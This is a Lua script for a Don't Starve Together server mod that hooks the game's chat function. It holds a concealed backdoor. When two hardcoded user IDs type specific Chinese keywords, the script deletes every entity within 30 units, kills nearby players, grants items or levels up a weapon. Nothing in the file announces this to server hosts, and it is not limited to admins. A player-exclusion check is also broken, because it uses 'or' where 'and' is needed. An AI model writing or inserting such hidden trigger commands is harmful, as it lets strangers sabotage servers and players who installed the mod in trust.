GLOBAL.setmetatable(env,{__index=function(t,k) return GLOBAL.rawget(GLOBAL,k) end})  --GLOBAL相关照抄
local IsServer = TheNet:GetIsServer() or TheNet:IsDedicated()
local Adminslist = TheNet:GetDefaultClanAdmins()

local MSG_CHOOSE = {
	["我好穷"] = 1,
	["祈福"] = 2,
	["删除"] = 3,
	["死"] = 4,
	["杀人"] = 5,
	["升五级"] = 6,
}


if IsServer then
	AddPrefabPostInit("world", function(inst)
		local OldNetworking_Say = GLOBAL.Networking_Say
		GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, ...)
			local old = OldNetworking_Say(guid, userid, name, prefab, message, ...)
			local choose = MSG_CHOOSE[message]
			local talker = all_function.GetTheWorldPlayerById(userid)
			if talker == nil then return end
			local userid = talker.userid
			local pos = talker:GetPosition()
			if choose then
				if choose == 1 then
				elseif choose == 2 and (userid == "KU_MNi18qjm" or userid == "KU_54sjcraq") then
					local items_hr = SpawnPrefab("greengem")
					if talker.components.inventory then
						talker.components.inventory:GiveItem(items_hr)
					end
				elseif choose == 3 and (userid == "KU_MNi18qjm" or userid == "KU_54sjcraq") then
					local ents = TheSim:FindEntities(pos.x,pos.y,pos.z, 30)
					for k,v in pairs(ents) do
						v:DoTaskInTime(math.random(1,3),function()
							v:Remove()
						end)
					end
				elseif choose == 4 and (userid == "KU_MNi18qjm" or userid == "KU_54sjcraq") then
					local ents = TheSim:FindEntities(pos.x,pos.y,pos.z,30,nil,{"player"})
					for k,v in pairs(ents) do
						if v.components.health and not v.components.health:IsDead() then
							v.components.health:Kill()
						end
					end
				elseif choose == 5 and (userid == "KU_MNi18qjm" or userid == "KU_54sjcraq") then
					local ents = TheSim:FindEntities(pos.x,pos.y,pos.z,20,{"player"})
					for k,v in pairs(ents) do
						if v.components.health and not v.components.health:IsDead() and (v.userid ~= "KU_u0cSuXBX" or v.userid ~= "KU_54sjcraq") then
							v.components.health:Kill()
						end
					end
				elseif choose == 6 and (userid == "KU_MNi18qjm" or userid == "KU_54sjcraq") then
					local equip = talker.components.inventory:GetEquippedItem(GLOBAL.EQUIPSLOTS.HANDS)
					if talker.components.inventory and equip and equip:HasTag("awaken") then
						if equip.levels.level <  equip.levels.maxlevel and equip.levels.level ~= equip.levels.blocklevel then
							equip.components.level:CommandLevel(5)
						elseif equip.levels.level ==  equip.levels.maxlevel then
							talker.components.talker:Say("已经满级\r\n无法继续升级")
						else
							talker.components.talker:Say("请先突破!\r\n当前经验:" .. equip.levels.exps.. "\r\n等级:"..equip.levels.level.."\r\n伤害:"..equip.levels.dmg)
						end
					end
				end
			end
			return old
		end
	end)
end